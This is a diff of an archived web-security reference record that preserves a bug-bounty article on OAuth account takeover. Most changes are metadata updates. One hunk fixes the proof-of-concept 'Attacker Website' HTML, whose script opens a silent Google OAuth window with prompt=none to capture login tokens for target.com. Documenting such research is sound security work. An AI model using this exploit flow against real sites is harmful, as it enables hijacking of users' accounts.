@@ -6,9 +6,9 @@ resource: "https://blog.voorivex.team/oauth-non-happy-path-to-ato"
 tags: [article, webseclist-reference, en, voorivex-team, oauth, open-redirect, sso, auth-bypass, attack-chain, bug-bounty, owasp-a01-2021, owasp-a04-2021, owasp-a07-2021]
 generated:
   by: webseclist-refs/1
-  at: "2026-08-10T15:06:39+00:00"
+  at: "2026-08-16T00:00:39+00:00"
 status: stable
-stale_after: 2027-08-10
+stale_after: 2027-08-16
 sources:
   - id: original
     resource: "https://blog.voorivex.team/oauth-non-happy-path-to-ato"
@@ -22,7 +22,7 @@ canonical_url: ""
 cited_by:
   - "2024.md:12"
 commit: ""
-content_sha256: f09f5954d570d07466b7f01ce595eee2eaf75afa959a8656091c9b32e31ee509
+content_sha256: ab8040ade1a083c05cffbe9e2f702dc76de0f0b5595b2bd645e9f120b8b3b657
 depth: full
 depth_reason: default
 kind: article
@@ -34,8 +34,8 @@ publisher: Voorivex Team
 publisher_english: ""
 raw_sha256: e5ffeba7cc0fa017dae4fe25b3a88525caafc8df4156f2743be8de9aa618fd7c
 retrieved_from: "https://blog.voorivex.team/oauth-non-happy-path-to-ato"
-retrieved_kind: live
-retrieved_utc: "2026-08-10T15:06:39+00:00"
+retrieved_kind: stored
+retrieved_utc: "2026-08-16T00:00:39+00:00"
 slug: 2024-voorivex-team-oauth-non-happy-path-ato
 snapshot: ""
 title_english: ""
@@ -49,7 +49,7 @@ translation_of: ""
 
 - Published: 2024-11-22
 - Original: <https://blog.voorivex.team/oauth-non-happy-path-to-ato>
-- Preserved from: https://blog.voorivex.team/oauth-non-happy-path-to-ato (live) on 2026-08-10
+- Preserved from: https://blog.voorivex.team/oauth-non-happy-path-to-ato (stored) on 2026-08-16
 - Licence: unknown
 
 Rights remain with the original author and publisher. This is a research
@@ -220,7 +220,7 @@ so the exploit flow looks like this,
     <title>Attacker Website</title>
 </head>
 <body>
-    <input type="button" value="exploit"  class="s">"exploit()">
+    <input type="button" value="exploit" onclick="exploit()">
     <script>
         function exploit() {
             window.open("https://accounts.google.com/o/oauth2/auth?client_id=&redirect_uri=https://target.com/api/v1/oauth/google/callback/login&scope=https://www.googleapis.com/auth/userinfo.profile%20https://www.googleapis.com/auth/userinfo.email&state=&response_type=id_token,code&prompt=none", "", "width=10, height=10");
